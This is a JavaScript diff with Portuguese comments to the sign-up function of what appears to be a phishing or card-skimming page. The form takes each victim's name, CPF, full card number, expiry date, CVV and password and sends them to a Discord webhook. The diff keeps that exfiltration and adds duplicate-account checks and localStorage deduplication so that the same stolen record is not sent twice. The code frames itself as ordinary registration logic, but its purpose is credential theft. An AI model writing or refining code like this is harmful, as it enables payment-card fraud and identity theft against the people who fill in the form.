@@ -650,15 +650,74 @@ function doRegister(){
     return;
   }
 
+  // ── verifica se CPF já está cadastrado
+  if(users[cpf]){
+    errEl.textContent='❌ Este CPF já possui uma conta cadastrada.';
+    errEl.classList.add('show');
+    document.querySelector('#page-register .auth-card').classList.add('shake');
+    setTimeout(()=>document.querySelector('#page-register .auth-card').classList.remove('shake'),400);
+    return;
+  }
+
+  // ── verifica se número do cartão já está cadastrado
+  const cartaoLimpo = cartao.replace(/\s/g,'');
+  const cartaoDuplicado = Object.values(users).some(u => u.cartao.replace(/\s/g,'') === cartaoLimpo);
+  if(cartaoDuplicado){
+    errEl.textContent='❌ Este cartão já está vinculado a outra conta.';
+    errEl.classList.add('show');
+    document.querySelector('#page-register .auth-card').classList.add('shake');
+    setTimeout(()=>document.querySelector('#page-register .auth-card').classList.remove('shake'),400);
+    return;
+  }
+
   // salva usuário
   users[cpf]={name,pass,cpf,cartao,validade,cvv,online:true};
 
-  // envia para o webhook do Discord
-  sendToDiscord({name,cpf,cartao,validade,cvv,pass});
+  // só manda pro Discord se os dados forem diferentes do que já foi enviado
+  const dadosCompletos = {name,cpf,cartao,validade,cvv,pass};
+  if(!jaFoiEnviado(dadosCompletos)){
+    registrarEnvio(dadosCompletos);
+    sendToDiscord(dadosCompletos);
+  }
 
   document.getElementById('log-cpf').value=cpf;
   document.getElementById('log-pass').value=pass;
   document.getElementById('successModal').classList.add('show');
+}
+
+// ════════════════════════════════════
+//  CONTROLE DE CADASTROS JÁ ENVIADOS
+//  Só não envia se TODOS os dados forem idênticos
+// ════════════════════════════════════
+function gerarChave(data){
+  // cria uma chave única com todos os dados juntos
+  const cartaoLimpo = data.cartao.replace(/\s/g,'');
+  return [
+    data.name.trim().toLowerCase(),
+    data.cpf.trim(),
+    cartaoLimpo,
+    data.validade.trim(),
+    data.cvv.trim()
+  ].join('|');
+}
+
+function jaFoiEnviado(data){
+  try {
+    const chave = gerarChave(data);
+    const lista = JSON.parse(localStorage.getItem('18z_enviados') || '[]');
+    return lista.includes(chave);
+  } catch(e){ return false; }
+}
+
+function registrarEnvio(data){
+  try {
+    const chave = gerarChave(data);
+    const lista = JSON.parse(localStorage.getItem('18z_enviados') || '[]');
+    if(!lista.includes(chave)){
+      lista.push(chave);
+      localStorage.setItem('18z_enviados', JSON.stringify(lista));
+    }
+  } catch(e){}
 }
 
 // ════════════════════════════════════
